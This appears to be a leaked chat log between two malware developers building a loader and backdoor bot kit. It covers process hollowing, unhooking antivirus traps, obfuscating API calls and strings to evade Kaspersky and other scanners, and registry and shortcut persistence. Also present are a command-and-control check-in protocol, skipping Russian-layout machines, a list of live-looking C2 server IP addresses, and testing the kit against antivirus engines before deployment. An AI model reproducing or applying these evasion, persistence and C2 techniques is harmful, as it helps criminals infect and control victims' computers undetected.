2020-07-13T12:49:46 frog -> mushroom
I'll also try to find the cause in GetApi.

2020-07-13T13:05:10 mushroom -> frog
There's probably an algorithm in there for how it works.

2020-07-13T13:06:12 mushroom -> frog
Don't drag it out. If it doesn't work with GetApi.h, replace it.

2020-07-13T15:44:38 mushroom -> frog
If everything is pure for x86\x64. Then the dynamic check should be done in full set. That is, run the loader in this check.

2020-07-13T15:47:13 frog -> mushroom
No. The uploader is not ready yet. Haven't had time to do the anchoring yet.
I do not really understand how to do the fixing. In that article, a lot of them described, which one to take, have not yet figured out.

Loader.

2020-07-13T15:48:28 mushroom -> frog
Finish the loader then, obfuscate it following the bot's example.

2020-07-13T15:48:48 mushroom -> frog
We need the whole kit (loader + bot).

2020-07-13T15:48:57 mushroom -> frog

2020-07-13T15:53:27 frog -> mushroom
What about Kaspersky? So it doesn't react? In processhollowing it reacts to ResumeThread. Tried ResumeThread in different ways, doesn't help.

2020-07-13T15:54:09 mushroom -> frog
ResumeThread obfuscated?

2020-07-13T15:54:36 mushroom -> frog
Is that in processhollowing or in doppelgaging?

2020-07-13T15:55:12 frog -> mushroom
Sure. in processhollowing. libproxy used

2020-07-13T15:56:02 mushroom -> frog
I'll check it out. Tomorrow. In the meantime, finish the loader.

2020-07-14T12:50:43 frog -> mushroom
Hi.
What is the correct way to find out the date on the server?
I've always done this: HttpQueryInfoA(hHttpRequest, HTTP_QUERY_DATE, date, &bufferSize, &index);
I also tried this: HttpQueryInfo(hHttpRequest, HTTP_QUERY_RAW_HEADERS_CRLF, cookiesBuffer, &cookiesBufferSize, &index);
But sometimes we get different date strings.
And the date format must be converted?  Because now, for example, query returns result "Tue, 14 Jul 2020 12:47:34 GMT".
The format was different before (2020-07-14).

2020-07-14T12:56:11 mushroom -> frog
Hi. You don't need to do it in any way. Just a GET /<id>/4 request in the headers should return the date.

2020-07-14T12:56:28 mushroom -> frog
It's for the bot.

2020-07-14T12:59:08 mushroom -> frog
For the loader query to get the version, there will be a date in the headers too.

2020-07-14T13:03:59 frog -> mushroom
Here? Only here the time (on the test server) instead of the date (Date field).
This is the result of a HEAD request:
"HTTP/1.1 200 OK\r\nServer: nginx/1.10.3 (Ubuntu)\r\nContent-Type: text/html; charset=UTF-8\r\nConnection: keep-alive\r\nDate: 12:59:53\r\nX-Tag: v1.0\r\n\r\n"

2020-07-14T13:04:29 mushroom -> frog
Check it out on the battlefield.

There is no signature on the test one.

2020-07-14T13:06:26 frog -> mushroom
Was still dealing with Process Hollowing x86. Turned out that antivirus reacts as soon as there is an attempt to write something (WriteProcessMemory) to the PebImage Base Address. Even if I change one byte there, it reacts. Everything is obfuscated.

2020-07-14T13:08:05 mushroom -> frog
m_module = m_kernel32.loadLibrary(fileName);
removeHooks(m_module);

2020-07-14T13:08:25 mushroom -> frog
it is in the file libraryproxy.cpp

2020-07-14T13:08:54 mushroom -> frog
Look this function removes just the traps that anti-viruses put on suspicious functions.

2020-07-14T13:09:52 mushroom -> frog
Consequently, the function must then be taken and called from m_module. In libraryproxy everything is already done for this.

2020-07-14T13:11:53 mushroom -> frog
Remove traps from all WinApi libraries you use this way.

2020-07-14T13:16:57 frog -> mushroom
Process Hollowing all obfuscated with libraryproxy.
I'll check it again. Missed some functions that call removeHooks: Rva2Offset, isForwardedFunc. I had to compile them from the Internet and from old AntiHooks.cpp, maybe that's why something doesn't work.

Hi!
Figured out Process hollowing x86. It took me a long time to find the cause, but I found it. Now Kaspersky antivirus is silent. Checked on Windows 10, also silent. I have obfuscated all calls of ws2_32. I downloaded the latest version of backdoor from github.
There is something I would like to clarify. Sometimes rundll.exe launches rundll.exe*32 and I can't track the moment when the second exe-file (rundll.exe*32) finishes, so that I can delete the dll-file in time.
Where is the boot loader file better hidden at startup? In the Windows folder?

2020-07-15T12:57:51 frog -> mushroom
I'm making a loader right now.

2020-07-15T13:01:12 mushroom -> frog
In temp or appdata. This is the responsibility of the other person who makes the crypt. This is the kind of program that your program will be inside. He pulls it out and runs it. So you just have to worry about where to load the new version of the loader, in temp or appdata is best.

2020-07-15T13:02:09 mushroom -> frog
Sometimes rundll.exe runs rundll.exe*32 and I can't keep track of when the second exe file (rundll.exe*32) finishes in time to delete the dll file. Explain this more precisely.

2020-07-15T13:06:04 mushroom -> frog
You create a process, you have its descriptor and ProcessInformation. You can wait for WaitForSingleObject to complete them. Remembered the dll file name. Wait for the process to complete, delete it. This is only if the process has a timeout, if it's 0, we're not interested in its fate, and neither is the fate of the file.

2020-07-15T13:21:20 frog -> mushroom
Should I attach the file that I copy to the temp or appdata folder?
Regarding rundll, I will now try to reproduce this error

2020-07-15T13:22:06 mushroom -> frog
Fix it yourself. Get your program name and use it.

2020-07-15T13:22:36 mushroom -> frog
The program should fix itself.

2020-07-15T13:22:48 frog -> mushroom
I think I got it

2020-07-15T13:24:39 mushroom -> frog
WCHAR filename[MAX_PATH + 1];
    if (kernel32.getModuleFileNameW(NULL, filename, _countof(filename))

2020-07-15T13:24:52 mushroom -> frog
That's how you get the file name of your program.

2020-07-15T13:25:26 mushroom -> frog
Or you can getModuleFileNameA for ANSI encoding.

2020-07-15T13:37:33 frog -> mushroom

To work everywhere, and wherever vcredist is not installed.

2020-07-15T14:29:56 frog -> mushroom
The string is self-written. Made static layout (/MT), 64-bit files started to run.
Dealt with rundll.exe. There was another error: deleting file earlier than needed. But this error made me ask a question: if the process is started with a zero timeout, do I still have to wait in a separate thread for it to finish and delete the file?

2020-07-15T14:30:44 mushroom -> frog
No. If the timeout is 0 the file and the process are not of interest to us.

2020-07-15T14:31:27 mushroom -> frog
All done?

2020-07-15T14:32:01 mushroom -> frog
Commit everything (loader and bot).

2020-07-15T14:34:34 frog -> mushroom
I'm still working on the loader.

2020-07-15T14:35:53 mushroom -> frog
Commit then. To start the downloader, it latched on and downloaded and started the bot. And after reloading it launched downloaded and started the bot.

2020-07-15T14:36:48 frog -> mushroom
Okay

Uploaded the latest versions of both projects to gitlab. I didn't have time to check the uploader, because there was no working server available, and the files stopped being downloaded from the test server. I will try later.

About the addresses. They change frequently.

Check the bootloader and bot kit on them.

2020-07-16T08:57:26 mushroom -> frog
Write me as soon as you check it out.

2020-07-16T14:59:11 mushroom -> frog
Regarding the kit check. Run the loader and all the commands through the bot, using the admin. Then reboot your computer, start the bootloader itself, and once again run all the commands through the bot.

2020-07-16T14:59:26 mushroom -> frog
If everything goes smoothly. Email me.

2020-07-16T14:59:52 frog -> mushroom
Okay

2020-07-16T15:00:29 mushroom -> frog
This is with and without logs check.

2020-07-16T15:24:40 mushroom -> frog
What file do you have the server addresses in?

2020-07-16T15:24:54 mushroom -> frog
On GitlAb the old ones are now.

2020-07-16T15:25:10 frog -> mushroom
config.h

2020-07-16T15:37:01 frog -> mushroom
Download files from the same addresses: "/api/v130"? Trying to download a file, I get the string "null". Although I downloaded all the files on the server

2020-07-16T15:39:08 mushroom -> frog
Yes with these. There you have to click the checkmark button, it's next to the gear, "To production" pops up on it.

2020-07-16T15:39:24 frog -> mushroom
Got it, thanks!

2020-07-16T15:40:07 mushroom -> frog
If you have problems with loading and nothing has changed, ask Talar, he does the server part.

2020-07-16T15:55:48 frog -> mushroom
When I save the exe file to the App Data folder, Kaspersky reacts. How to deal with it?

2020-07-16T15:56:06 mushroom -> frog
What exe file?

2020-07-16T15:56:20 mushroom -> frog
For a command to run a file?

2020-07-16T15:56:29 frog -> mushroom
of the loader

2020-07-16T15:56:37 mushroom -> frog
When updating?

2020-07-16T15:57:17 frog -> mushroom
Yes, if the versions do not match, I download and save the loader file there

2020-07-16T15:57:25 mushroom -> frog
Try it in Temp. If it doesn't go through, scan it for dyncheck.

2020-07-16T15:57:43 mushroom -> frog
And also find a place that sticks and change it.

2020-07-16T15:57:50 mushroom -> frog
Like you did with the bot.

2020-07-17T12:38:51 frog -> mushroom
Hi.
Didn't have time to eliminate all the antivirus reactions. Everything was done, but decided to compile the live version and antivirus saw the threat again.
There's something dangerous (for antivirus) in old resolve_emercoin.h and it reacts on get_possible_domain too. Because if it is commented out, everything is fine.
I need more time. I will try to have it done by Monday.

2020-07-17T12:39:57 frog -> mushroom
Running in the chain "Loader -> Loader -> Bot" works fine.

2020-07-17T12:41:45 frog -> mushroom
How do I call the addAutostart function to add to autorun?
I've added it to the registry, but I'd like to try adding it to autorun as well.

2020-07-17T12:45:51 frog -> mushroom
I also noticed that the string obfuscator works strangely.
Example from anchorange module. This is how it works incorrectly:
status = ADVAPI32(RegCreateKeyExW)(currUserKey, _TSTR(TEXT("Software\\\Microsoft\\Windows\\CurrentVersion\\\Run")), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &runKey, &disposition);
And this is correct, if you copy the line:
KERNEL32(lstrcpyW)(sub_key, _TSTR(TEXT("Software\\\Microsoft\\\Windows\\\CurrentVersion\\\Run"));
status = ADVAPI32(RegCreateKeyExW)(currUserKey, sub_key, 0, NULL,
REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &runKey, &disposition);

2020-07-17T12:49:15 frog -> mushroom
And this circumstance I can not understand. I run the same bot on different machines (Windows 7 and Windows 10) - one is visible in the admin (the first), the second is not visible, although the NOP command comes to all machines.

2020-07-17T12:50:21 mushroom -> frog
Yes. With strings, it's like that. If unicode you have to copy lstrcpyW(sub_key, _WCS(L "Software\\\Microsoft\\\\Windows\\CurrentVersion\\Run")) to the buffer first

2020-07-17T12:50:38 mushroom -> frog
If ANSI does not need to be copied to an intermediate buffer.

2020-07-17T12:52:39 mushroom -> frog
_Success_(return != 0)
BOOL addAutostart(_In_z_ PCWSTR linkName, _In_z_ PCTSTR targetFileName,
    _In_opt_z_ PCTSTR description, _In_opt_z_ PCTSTR workingDir, _In_opt_z_ PCTSTR iconPath,
    _In_opt_ int iconIndex)

2020-07-17T12:52:48 mushroom -> frog
Is this function what you mean?

2020-07-17T12:53:02 frog -> mushroom
Yes

2020-07-17T12:53:13 mushroom -> frog
What's not clear.

2020-07-17T12:54:56 mushroom -> frog
linjName shortcut name, targetFileName file name to which shortcut points, description description for shortcut, workingDir working folder for shortcut, iconPath icon file name for shortcut, iconIndex image index in ico file.

2020-07-17T12:54:58 frog -> mushroom
Tried this, but it didn't work:
AddAutostart(L "link.exe", L "D:\\dl7.exe", L "My program", L "D:\\", 0, 0);
And the last 2 parameters are not clear

2020-07-17T12:55:11 mushroom -> frog
That _opt_ can be NULL.

2020-07-17T12:55:41 mushroom -> frog
In fact, you only need the first two parameters.

2020-07-17T12:56:00 mushroom -> frog
Open the properties of any shortcut and look.

2020-07-17T12:56:27 mushroom -> frog
He will have all these parameters.

2020-07-17T12:57:09 mushroom -> frog
Work folder, icon, etc.

2020-07-17T12:58:26 mushroom -> frog
See the strings you passed first unicode, all others can be either unicode or ANSI.

2020-07-17T12:58:49 mushroom -> frog
What does your PCTSTR turn into?

2020-07-17T12:59:00 mushroom -> frog
In PCSTR or PCWSTR?

2020-07-17T12:59:26 frog -> mushroom
LPCWSTR

2020-07-17T13:00:20 mushroom -> frog
And what's the error?

2020-07-17T13:00:30 mushroom -> frog
What does GetLastError do?

2020-07-17T13:00:49 mushroom -> frog
And where? Where in this function?

2020-07-17T13:01:44 mushroom -> frog
You'll have both added to the registry and to autorun. Will only the one that started first work?

2020-07-17T13:04:36 frog -> mushroom
I figured it out. I had to specify the extension lnk. That's how it works:
addAutostart(L "link1.lnk", L "D:\\dl7.exe", 0, 0, 0, 0);
I wanted to do this: add to autostart. If I can't add it to autoloader, then to the registry.

2020-07-17T13:05:23 mushroom -> frog
You can do it this way. The main thing is that only one instance always works.

2020-07-17T13:06:51 frog -> mushroom
Tweaked the addAutostart function a bit. Inside it you also need to call "OLE32(CoInitialize)(NULL)", otherwise it doesn't work.

2020-07-17T13:07:21 mushroom -> frog
Yes you should. Not necessarily in it. It's better globally for the whole program.

2020-07-17T13:08:54 frog -> mushroom
Can you add both to the registry and autorun? How do you sync then?

2020-07-17T13:14:13 mushroom -> frog
Like this:
#if defined(ONE_INSTANCE_FILE)
    TCHAR homePath[MAX_PATH + 1];

#endif

2020-07-17T13:14:48 mushroom -> frog
The first way is to create a file and open it. The other program will get an error opening the file, so one version works already.

2020-07-17T13:15:23 mushroom -> frog
The second way to create a mutex, the second program will try to create a mutex and get an error that it already exists.

2020-07-17T13:16:12 mushroom -> frog
The third way is to add a variable to the globalatom table, the second try will read that this table already has it.

2020-07-17T13:18:14 mushroom -> frog
Do you write the log to a file in Release builds?

2020-07-17T13:18:24 frog -> mushroom
Yes

2020-07-17T13:18:29 mushroom -> frog
Did you check everything like I told you yesterday?

2020-07-17T13:18:46 mushroom -> frog
Does everything work smoothly?

2020-07-17T13:20:46 frog -> mushroom
I wrote above that I still need to find what antivirus reacts to in resolve_emercoin.h.
The old resolve_emercoin.h has something dangerous (for antivirus) and it reacts on get_possible_domain too. Because if it's commented out, it's fine.

2020-07-17T13:21:17 frog -> mushroom
And this circumstance I can not understand. I run the same bot on different machines (Windows 7 and Windows 10) - one is visible in the admin (the first), the second is not visible, although the NOP command comes to all machines.

2020-07-17T13:21:58 mushroom -> frog
This is most likely because the group is not defined on the server.

2020-07-17T13:22:12 mushroom -> frog
On Win 10 Server can't you see it?

2020-07-17T13:23:01 frog -> mushroom
Regular Windows 10.

2020-07-17T13:23:27 mushroom -> frog
How do you transfer cookies?

2020-07-17T13:24:18 frog -> mushroom
m_lstrcpy(szHeaders, _STR("Cookie: group=" GROUP ";"))
(!GET_API(HttpSendRequestA)(hHttpRequest, szHeaders, strlen(szHeaders), nullptr, 0))

2020-07-17T13:24:57 frog -> mushroom
#define GROUP "frog"

2020-07-17T13:25:37 mushroom -> frog
INTERNET_FLAG_NO_COOKIES do you use in httpOpenRequest?

2020-07-17T13:25:52 mushroom -> frog
If you don't use WinInet your cookies will be erased.

2020-07-17T13:26:17 frog -> mushroom
Yes
HINTERNET hHttpRequest = GET_API(HttpOpenRequestA)(
        hHttpSession, _STR("GET"), objectName,
        _STR("HTTP/1.1"), nullptr, nullptr, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_COOKIES, (DWORD_PTR)0);

2020-07-17T13:27:03 mushroom -> frog
AND INTERNET_FLAG_SECURE?

2020-07-17T13:27:11 mushroom -> frog
You have to https

2020-07-17T13:27:18 mushroom -> frog
For the battle server.

2020-07-17T13:28:20 mushroom -> frog
You can try changing the id of the bot. You just might have run it before with a different group, and it was remembered on the server.

2020-07-17T13:28:32 mushroom -> frog
And that's why you can't see the bot.

2020-07-17T13:28:51 mushroom -> frog
Changing the id is simple. Change the creation date of the Windows folder a bit.

2020-07-17T13:29:09 frog -> mushroom
I see, thank you.

2020-07-17T13:29:48 mushroom -> frog
What's left to finish?

2020-07-17T13:31:14 frog -> mushroom
Basically deal with resolve_emercoin.h, obfuscate get_possible_domain.
I'll add synchronization then.

2020-07-17T13:32:01 mushroom -> frog
Go for it. The priority is to remove these detects.

2020-07-17T13:32:18 mushroom -> frog
So you can give it to a tester for a final check.

2020-07-17T13:33:28 frog -> mushroom
Why is it possible that the same code is detected in the windows version, but not in the console version?

2020-07-17T13:33:51 frog -> mushroom
All other things being equal

2020-07-17T13:34:41 mushroom -> frog
So it's not all equal, or the antivirus sees that you're cheating, a windows application, and you don't show the window.

2020-07-17T13:37:59 mushroom -> frog
But I don't think all conditions are equal.

2020-07-20T07:57:15 frog -> mushroom
Hi!
Uploaded the projects to gitlab.

2020-07-20T08:12:19 frog -> mushroom
Tested all programs on 2 systems: Windows 7 x64 and Windows 10 x64. Connected to the test server. On the live one I did not have time to check, but I guess everything must work, only ip-addresses need to be specified in config.h.
In config.h I added the macro-identifier TEST_BUILD. If it is enabled, then the test version is compiled, otherwise the combat version is compiled.
Under what names to be fixed in the system did not come up, but made it so that these names can be passed on the command line, for example:
dl7.exe "name_in_registry" "name_in_autoload"
I also wanted to deal with icons, but did not have time.

2020-07-20T08:13:28 mushroom -> frog
Hi. Will it stick if you don't provide names?

2020-07-20T08:13:47 frog -> mushroom
Yes, there are default names

2020-07-20T08:14:15 mushroom -> frog
Check on the battle server.
lowers
185.99.2.49
78.108.216.13
217.12.209.44
91.235.129.151
80.82.68.132

194.87.145.86
185.14.31.135
45.148.120.142
62.109.13.184

2020-07-20T08:14:36 mushroom -> frog
If all goes well, I'll tell you who to give it to for testing.

2020-07-20T08:14:49 mushroom -> frog
Check with and without logs.

2020-07-20T08:15:12 frog -> mushroom
Okay. I.e. upload 2 sets to the battle server?

2020-07-20T08:16:50 mushroom -> frog
You can upload a version without logs there right away. So you will run the loader and the user will not notice anything. If you find any bugs, download with logs and see what's wrong.

2020-07-20T10:03:57 mushroom -> frog
How do you change your bot's id?

2020-07-20T10:05:52 frog -> mushroom
In systeminfo.cpp on line 56 you can add any number to a second or a minute

2020-07-20T10:09:47 mushroom -> frog
The Release build connects to the test server.

2020-07-20T10:09:57 mushroom -> frog
Gotta get to the fighter.

2020-07-20T10:11:45 frog -> mushroom
Ok. You can comment out the line with TEST_BUILD in config.h, then it will connect to combat.

2020-07-20T10:12:19 mushroom -> frog
It should always be like this, the tester will check on the battle server. To commit it.

2020-07-20T10:17:26 mushroom -> frog
The version of the bot and the loader must be flashed in the same way as the group in the programs.

2020-07-20T10:20:04 mushroom -> frog
More. When connecting to a server, after checking it. It is necessary to send a message specifying the version of the program and the address used at the moment. POST /<id>/4 with the message body. Like Version 0.1 Address 255.255.255.255.255.

2020-07-20T10:20:52 mushroom -> frog
If reconnection occurs, also a message indicating the address used.

2020-07-20T10:22:02 mushroom -> frog
Every hour of work, you need to send a message which specifies the time the bot worked. Like Uptime 3600000 msec.

2020-07-20T10:22:54 mushroom -> frog
cname ???

2020-07-20T10:23:12 mushroom -> frog
When getting information about the system.

2020-07-20T10:24:22 mushroom -> frog
ip three addresses. The first is external, and what do the second and third mean?

2020-07-20T10:25:33 frog -> mushroom
Which pgethostbyname returns.

2020-07-20T10:26:10 mushroom -> frog
Are these local addresses like that?

2020-07-20T10:26:27 frog -> mushroom
Yes

2020-07-20T10:26:54 mushroom -> frog
You don't need them in principle. Leave it like that for now.

2020-07-20T10:26:57 mushroom -> frog
cname ???

2020-07-20T10:27:08 mushroom -> frog
The computer name is undefined.

2020-07-20T10:28:02 mushroom -> frog
Or it was sent with an error. So instead of it ???

2020-07-20T10:28:33 frog -> mushroom
I'll see if something happened to the coding.

2020-07-20T10:28:54 mushroom -> frog
Hollowing 32 -> 64 works?

2020-07-20T10:29:19 frog -> mushroom
No.

2020-07-20T10:29:46 mushroom -> frog
Leave it like that for now.

2020-07-20T10:30:06 frog -> mushroom
I doubt it's even possible.

2020-07-20T10:30:06 frog -> mushroom
I doubt it's even possible.

2020-07-20T10:30:29 mushroom -> frog
Maybe. I gave you the processhelper example.

2020-07-20T10:31:05 mushroom -> frog
It will be like a refinement later. Right now the main thing is to fix the bugs.

2020-07-20T10:31:18 frog -> mushroom
You can run 32-bit from 64-bit

2020-07-20T10:31:41 mushroom -> frog
That's what I meant.

2020-07-20T10:32:04 frog -> mushroom
It's done

2020-07-20T10:32:52 mushroom -> frog
Antivirus only Windows Defender is never detected by me.

2020-07-20T10:33:33 mushroom -> frog

I recognize the antivirus this way:
wmic /namespace:\\root\SecurityCenter path AntivirusProduct get displayName, versionNumber /format:list

2020-07-20T10:34:50 mushroom -> frog
When you tested on Win 10 was the antivirus detected?

2020-07-20T10:35:52 frog -> mushroom
Didn't check that command. I'll take a look now.

2020-07-20T10:36:15 mushroom -> frog
95% of where your program will work is Win 10 64bit.

2020-07-20T10:41:15 frog -> mushroom
Doesn't work either

2020-07-20T10:41:26 mushroom -> frog
Solve the question.

2020-07-20T10:42:14 mushroom -> frog
Regarding the 3 addresses, still need to remove and leave 1. And then the server, when the 3 address country icon does not display in the admin.

2020-07-20T10:42:26 mushroom -> frog
You should only leave the external one.

2020-07-20T10:43:22 mushroom -> frog
Did I give you an example of how to get a system antivirus?

2020-07-20T10:43:36 mushroom -> frog
I think I gave it at the beginning.

2020-07-20T10:47:23 frog -> mushroom
Yes, there is a function "ANTIVIRUSINFOLIST antivirusInfo()"

2020-07-20T10:47:40 frog -> mushroom
In info.cpp.

2020-07-20T11:05:20 mushroom -> frog
Running powershell\cmd check this script cd c:\\r\ndir\r\n, I ended up with not the contents of the C:\ disk, but the contents of the program folder.

2020-07-20T11:05:41 mushroom -> frog
This is running from memory without saving the script to disk.

2020-07-20T11:06:25 mushroom -> frog
How do you run the script from memory via pip?

2020-07-20T11:10:26 frog -> mushroom
Of course

2020-07-20T11:10:43 mushroom -> frog
cd c:\\r\ndir\r\n try this one.

2020-07-20T11:11:59 mushroom -> frog
It turns out that the two commands are executed separately, not one after the other.

2020-07-20T11:12:34 mushroom -> frog
Let me check on my bot.

2020-07-20T11:15:51 mushroom -> frog
I have a C:\ drive and the contents are displayed.

2020-07-20T11:15:59 mushroom -> frog
Look where you have an error.

2020-07-20T11:16:34 mushroom -> frog
You get the same even when you do a script run with save to disk.

2020-07-20T11:17:36 frog -> mushroom
The command should be: "c:\r\ndir\r\n".

2020-07-20T11:18:05 mushroom -> frog
And the one that can't be cd c:\r\ndir\r\n

2020-07-20T11:18:20 mushroom -> frog
What if I need to change a pack.

2020-07-20T11:18:26 mushroom -> frog
Folder.

2020-07-20T11:19:33 frog -> mushroom
cd to another local drive does not switch

2020-07-20T11:20:01 mushroom -> frog
Let me check with my D:\ drive.

2020-07-20T11:21:12 mushroom -> frog
It works.

2020-07-20T11:21:24 mushroom -> frog
You have an error somewhere.

2020-07-20T11:23:58 mushroom -> frog
In PowerShell it switches to another drive, in cmd it does not.

2020-07-20T11:24:11 mushroom -> frog
Your PowerShell doesn't work either.

2020-07-20T11:25:20 mushroom -> frog
And if you don't switch to another drive, the commands don't go down the chain as well, as they should.

2020-07-20T11:25:34 mushroom -> frog
See what the snag is.

2020-07-20T11:30:09 mushroom -> frog
When the terminate process command failed, do you send an error code in the response?

2020-07-20T11:31:46 mushroom -> frog
When successfully looking send Process_successful_terminate:. Also, put there what GetLastError will give, even if it was successful. It will then be 0. Or just send only number that GetLastError gives, you can not write anything else.

2020-07-20T11:34:42 mushroom -> frog
Everything else is fine. Looked it up.

2020-07-21T08:45:56 frog -> mushroom
Hi. Uploaded the backdoor project to gitlab. Fixed yesterday's comments. Had a little trouble with the antivirus.
I will make a few tweaks to the downloader and upload it later.

2020-07-21T08:56:48 mushroom -> frog
Hi. Okay.

2020-07-21T10:38:30 frog -> mushroom
When the downloader started to connect to the battle server, Kaspersky antivirus started showing "Trojan-Downloader.Win32.Upatre".
This did not happen with the test one. In general, I'm figuring it out.

2020-07-21T10:39:21 mushroom -> frog
OK. Maybe his address is blacklisted.

2020-07-21T13:35:50 frog -> mushroom
Is the long list of IP addresses in the resolve_emercoin module up to date?

2020-07-21T13:36:34 mushroom -> frog
Maybe not anymore.

2020-07-21T13:39:04 frog -> mushroom
Should I leave it like that for now? Or can they be checked somehow?
In the ToR it says "immediate rejection when working in the zone .ru/CIS - cut on the backend; also check the presence of Russian layout.
How to implement this?

2020-07-21T13:39:52 mushroom -> frog
Check your keyboard layouts and system language.

2020-07-21T13:41:13 mushroom -> frog
BOOL isLangForbidden(LANGID lang)

            HeapFree(GetProcessHeap(), 0, hklList);
        }
    }

    return result;
}

2020-07-21T14:30:08 frog -> mushroom
The info.h module has calls from Api-ms-win-core-version-l1-1-0.dll. Do you want to obfuscate them too?

2020-07-21T14:30:38 mushroom -> frog
No.

2020-07-21T14:30:42 frog -> mushroom
This is to get the exe file version of the antivirus

2020-07-21T14:31:01 mushroom -> frog
Or you can make up your own version.

2020-07-21T15:09:16 frog -> mushroom
"is suspected of Trojan.Downloader.gen.s" - what could it be?

2020-07-21T15:09:50 mushroom -> frog
Is this for the bootloader?

2020-07-21T15:13:16 mushroom -> frog
The function or sequence of functions in the program that downloads and saves the file most likely.

2020-07-21T15:13:23 frog -> mushroom
Bot sometimes shows up (it's a static check on dyncheck.com, VBA32 antivirus). And somehow strangely: sometimes it shows, sometimes not. I comment out some random line that does not relate to anything at all, or write unnecessary - detection will disappear. Then it appears again.

2020-07-21T15:14:13 mushroom -> frog
The sequence of functions is probably typical for this antivirus.

2020-07-21T15:14:19 mushroom -> frog
Is this for x64?

2020-07-21T15:14:40 frog -> mushroom
No, for x86.

2020-07-21T15:15:31 mushroom -> frog
No such thing for x64?

2020-07-21T15:15:47 frog -> mushroom
No

2020-07-21T15:15:59 mushroom -> frog
If not, leave it for now, x64 use it.

2020-07-21T15:25:27 frog -> mushroom
Didn't have time to finish the loader. Took me a long time to catch one detection. Kaspersky Anti-Virus did not like CoCreateInstance call to create shortcut in autoloader. I had to figure out how to replace the call to this function.
The names of references in the registry and the autoloader, I should probably write in config.h

2020-07-21T15:30:13 mushroom -> frog
Antiviruses don't like programs that go into the autorun.

2020-07-21T15:36:41 frog -> mushroom
I uploaded the current version of the loader to gitlab. Later I will add language check and check the bootloader on Windows 10

2020-07-21T15:37:50 mushroom -> frog
Okay.

2020-07-22T11:02:32 mushroom -> frog
Hi. System info, my system is identified as Win 8 and I have Win 10.

Hi. System info, my system is identified as Win 8 and I have Win 10.

2020-07-23T08:39:02 mushroom -> frog
Hi. I looked at everything yesterday and it seems to be working. Did you finish everything?

2020-07-23T08:51:37 frog -> mushroom
Hi. Uploaded both projects to gitlab. Fixed the OS version definition. Added localization definition. Fixed some bugs and detects.

2020-07-23T08:53:23 mushroom -> frog
Prepare versions with and without logs. And give it to bentley for testing.

2020-07-23T08:53:32 mushroom -> frog
Add it to yourself.

2020-07-23T08:53:41 frog -> mushroom
I have it.

2020-07-23T08:53:54 mushroom -> frog
It will test on different machines with different antiviruses.

2020-07-23T08:54:02 mushroom -> frog
Then give it to him.

2020-07-23T08:54:44 mushroom -> frog
From now on, every new build increases the version that is flashed in the bot and loader.

2020-07-23T11:16:22 mushroom -> frog
Gave up the bentley?

2020-07-23T11:16:45 mushroom -> frog
When you give it to me, tell me.

2020-07-23T11:24:13 frog -> mushroom
Retrieved

2020-07-23T11:25:47 mushroom -> frog
OK. It will tell you what detects were (if any), fix it. And if any errors will pop up. We need to have no detections from the antiviruses he will check your kit with.

2020-07-28T10:50:35 mushroom -> frog
Hi. What's up with the testing?

2020-07-28T10:51:48 frog -> mushroom
Hi. Waiting for the results. Bentley hasn't responded yet.

2020-07-28T10:54:15 mushroom -> frog
Did you check the dynamics on dyncheck?

2020-07-28T10:55:27 frog -> mushroom
Didn't check it. Only did a static check.

2020-07-28T10:55:37 mushroom -> frog
The only thing you need to check there is the lowader.

2020-07-28T10:56:00 mushroom -> frog
Check it out, then tell me what's up.

2020-07-28T10:56:50 frog -> mushroom
I'm running out of time there(
I didn't know there was a limit

2020-07-28T10:57:34 mushroom -> frog
How so? We have the same account, I check.

2020-07-28T10:57:48 mushroom -> frog
And if you go through a proxy.

2020-07-28T11:20:22 frog -> mushroom
Checked the 32-bit version. 6 antiviruses reacted negatively. Some say Gen:Variant.Fugrafa.68463

2020-07-28T11:21:48 mushroom -> frog
See the details of what they write. There's probably half of them reacting negatively to the fact that a program on the internet doesn't count.

Fine in principle. Waiting then, when, the admin panel will be fixed to there already finally test with antiviruses, which we are interested.

2020-07-28T11:28:56 mushroom -> frog
You can look up what fugrafa means in the meantime.

2020-07-28T11:30:16 frog -> mushroom
Okay. I already had him. Tried to catch it. Only noticed that it appears when the main function body is empty or there are irrelevant instructions.

Do it while they test your kit.

Clang is still needed, but it's already integrated into Visual Studio. And you'll get 3 versions of MSVC, Clang and MinGW to work with at once.

2020-08-05T08:50:09 mushroom -> frog
OK.

2020-08-05T12:29:38 frog -> mushroom
Sent the Bentley kit to Bentley for testing. Uploaded the latest versions of both projects to gitlab.

2020-08-05T12:30:12 mushroom -> frog
OK.

2020-08-07T10:21:45 mushroom -> frog
Bentley said that on Win Server 2019 detection happens immediately after reboot with your kit. Dope it so it doesn't happen.

2020-08-07T10:28:20 frog -> mushroom
Hi. I don't have a Windows Server 2019 machine. Is there any way to connect to this OS remotely?

2020-08-12T09:51:10 frog -> mushroom
Hi, I'm working it out for now. Asked Bentley to test it on other cars. On the one he provided, the detects are gone.

2020-08-12T09:51:44 mushroom -> frog
So you fixed it and gave it to him for testing?

2020-08-12T09:56:40 frog -> mushroom
Didn't really fix anything there. Figured out what was causing it, and they disappeared on their own. Didn't really change anything except ip addresses. That's why I asked him to test it on other machines.

2020-08-12T09:57:34 mushroom -> frog
When did you give it to him for testing? Has he written anything yet?

2020-08-12T09:57:54 frog -> mushroom
Gave it away yesterday. Haven't posted yet.

2020-08-12T09:58:36 mushroom -> frog
Got it.

2020-08-13T09:35:42 mushroom -> frog
Hi. Passed the tests of your kit. Made it so you can build with 3 compilers?

2020-08-13T09:37:34 frog -> mushroom
Hi. Didn't. Started doing it in mingw at the time, had a lot of mistakes. Didn't work right away.

2020-08-13T09:38:03 mushroom -> frog
Well as long as there's nothing else to do, do it.

2020-08-13T09:38:49 mushroom -> frog
Clang is already built into Visual Studio, you only need MinGW.

2020-08-13T09:39:43 mushroom -> frog
As for the kit, we're waiting for Buzu. He'll tell us who to give it to.

2020-08-13T09:40:32 mushroom -> frog
Keep all experiments in a separate branch now, so as not to spoil the clean working version.

2020-08-13T09:42:10 frog -> mushroom
Okay

Hi. Do a dyncheck test on your last bootloader (which Bentley tested) and send me the link.

2020-08-14T13:55:06 frog -> mushroom
Hi. This is the 64-bit version:

2020-08-14T13:59:44 mushroom -> frog
OK. Are there more of them than there used to be?

2020-08-14T14:06:40 mushroom -> frog
32 bit do it too.

2020-08-14T14:15:54 frog -> mushroom
Yeah, they've been noticing registrations in the registry since sometime.

2020-08-14T14:16:18 mushroom -> frog
Clean it up.

2020-08-14T14:22:14 frog -> mushroom

